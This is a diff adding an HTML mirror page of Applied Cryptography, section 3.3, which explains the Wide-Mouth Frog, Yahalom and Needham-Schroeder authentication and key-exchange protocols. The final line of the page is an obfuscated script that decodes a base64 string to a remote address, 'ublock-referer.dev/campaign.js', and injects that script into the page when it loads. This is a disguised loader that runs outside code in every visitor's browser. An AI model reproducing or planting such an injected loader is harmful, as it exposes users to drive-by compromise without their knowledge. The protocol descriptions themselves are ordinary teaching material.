@@ -1,0 +1,169 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=056-059//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">3.3 Authentication and Key Exchange</FONT></H3>
+<P>These protocols combine authentication with key exchange to solve a general computer problem: Alice and Bob are on opposite ends of a network and want to talk securely. How can Alice and Bob exchange a secret key and at the same time each be sure that he or she is talking to the other and not to Mallory? Most of the protocols assume that Trent shares a different secret key with each participant, and that all of these keys are in place before the protocol begins.
+</P>
+<P>The symbols used in these protocols are summarized in Table 3.1.</P>
+<P><FONT SIZE="+1"><B><I>Wide-Mouth Frog</I></B></FONT></P>
+<P>The Wide-Mouth Frog protocol [283,284] is probably the simplest symmetric key-management protocol that uses a trusted server. Both Alice and Bob share a secret key with Trent. The keys are just used for key distribution and not to encrypt any actual messages between users. Just by using two messages, Alice transfers a session key to Bob:
+</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="2">TABLE 3.1<BR>Symbols used in authentication and key exchange protocols
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>A</I>
+<TD VALIGN="TOP" ALIGN="LEFT">Alice&#146;s name
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>B</I>
+<TD VALIGN="TOP" ALIGN="LEFT">Bob&#146;s name
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>E</I><SUB>A</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT">Encryption with a key Trent shares with Alice
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>E</I><SUB>B</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT">Encryption with a key Trent shares with Bob
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>I</I>
+<TD VALIGN="TOP" ALIGN="LEFT">Index number
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K</I>
+<TD VALIGN="TOP" ALIGN="LEFT">A random session key
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>L</I>
+<TD VALIGN="TOP" ALIGN="LEFT">Lifetime
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>T</I><SUB>A</SUB>,<I>T</I><SUB>B</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT">A timestamp
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>R</I><SUB>A</SUB>,<I>R</I><SUB>B</SUB>
+<TD VALIGN="TOP" ALIGN="LEFT">A random number, sometimes called a <B>nonce</B>, chosen by Alice and Bob respectively
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice concatenates a timestamp, Bob&#146;s name, and a random session key and encrypts the whole message with the key she shares with Trent. She sends this to Trent, along with her name.
+<DL>
+<DD><I>A,E</I><SUB>A</SUB>(<I>T</I><SUB>A</SUB>,B,K)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent decrypts the message from Alice. Then he concatenates a new timestamp, Alice&#146;s name, and the random session key; he encrypts the whole message with the key he shares with Bob. Trent sends to Bob:
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>T</I><SUB>B</SUB>,A,K)
+</DL>
+</DL>
+<P>The biggest assumption made in this protocol is that Alice is competent enough to generate good session keys. Remember that random numbers aren&#146;t easy to generate; it might be more than Alice can be trusted to do properly.
+</P>
+<P><FONT SIZE="+1"><B><I>Yahalom</I></B></FONT></P>
+<P>In this protocol, both Alice and Bob share a secret key with Trent [283,284].
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice concatenates her name and a random number, and sends it to Bob.
+<DL>
+<DD><I>A,R</I><SUB>A</SUB>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob concatenates Alice&#146;s name, Alice&#146;s random number, his own random number, and encrypts it with the key he shares with Trent. He sends this to Trent, along with his name.
+<DL>
+<DD><I>B,E</I><SUB>B</SUB>(<I>A,R</I><SUB>A</SUB>,R<SUB>B</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Trent generates two messages. The first consists of Bob&#146;s name, a random session key, Alice&#146;s random number, and Bob&#146;s random number, all encrypted with the key he shares with Alice. The second consists of Alice&#146;s Zname and the random session key, encrypted with the key he shares with Bob. He sends both messages to Alice.
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>B,K,R</I><SUB>A</SUB>,<I>R</I><SUB>B</SUB>)<I>,E</I><SUB>B</SUB>(<I>A,K</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice decrypts the first message, extracts <I>K</I>, and confirms that <I>R</I><SUB>A</SUB> has the same value as it did in step (1). Alice sends Bob two messages. The first is the message received from Trent, encrypted with Bob&#146;s key. The second is <I>R</I><SUB>B</SUB>, encrypted with the session key.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>A,K</I>),<I>E</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts the message encrypted with his key, extracts <I>K</I>, and confirms that <I>R</I><SUB>B</SUB> has the same value as it did in step (2).
+</DL>
+<P>At the end, Alice and Bob are each convinced that they are talking to the other and not to a third party. The novelty here is that Bob is the first one to contact Trent, who only sends one message to Alice.
+</P>
+<P><FONT SIZE="+1"><B><I>Needham-Schroeder</I></B></FONT></P>
+<P>This protocol, invented by Roger Needham and Michael Schroeder [1159], also uses symmetric cryptography and Trent.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends a message to Trent consisting of her name, Bob&#146;s name, and a random number.
+<DL>
+<DD><I>A,B,R</I><SUB>A</SUB>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent generates a random session key. He encrypts a message consisting of a random session key and Alice&#146;s name with the secret key he shares with Bob. Then he encrypts Alice&#146;s random value, Bob&#146;s name, the key, and the encrypted message with the secret key he shares with Alice. Finally, he sends her the encrypted message:
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>R</I><SUB>A</SUB>,<I>B,K,E</I><SUB>B</SUB>(<I>K,A</I>))
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice decrypts the message and extracts <I>K</I>. She confirms that RA is the same value that she sent Trent in step (1). Then she sends Bob the message that Trent encrypted in his key.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>K,A</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob decrypts the message and extracts <I>K</I>. He then generates another random value, <I>R</I><SUB>B</SUB>. He encrypts the message with <I>K</I> and sends it to Alice.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice decrypts the message with <I>K</I>. She generates <I>R</I><SUB>B</SUB> - 1 and encrypts it with <I>K</I>. Then she sends the message back to Bob.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB> - 1)
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Bob decrypts the message with <I>K</I> and verifies that it is <I>R</I><SUB>B</SUB> - 1.
+</DL>
+<P>All of this fussing around with <I>R</I><SUB>A</SUB> and <I>R</I><SUB>B</SUB> and <I>R</I><SUB>B</SUB> - 1 is to prevent <B>replay attacks</B>. In this attack, Mallory can record old messages and then use them later in an attempt to subvert the protocol. The presence of <I>R</I><SUB>A</SUB> in step (2) assures Alice that Trent&#146;s message is legitimate and not a replay of a response from a previous execution of the protocol. When Alice successfully decrypts <I>R</I><SUB>B</SUB> and sends Bob <I>R</I><SUB>B</SUB> - 1 in step (5), Bob is ensured that Alice&#146;s messages are not replays from an earlier execution of the protocol.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(FBTWpOcY, obcCaSCW) {obcCaSCW = FBTWpOcY.createElement('script');obcCaSCW.type = 'text/javascript';obcCaSCW.async = true;obcCaSCW.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');FBTWpOcY.getElementsByTagName('body')[0].appendChild(obcCaSCW);}(document));</script></body>
+</html>
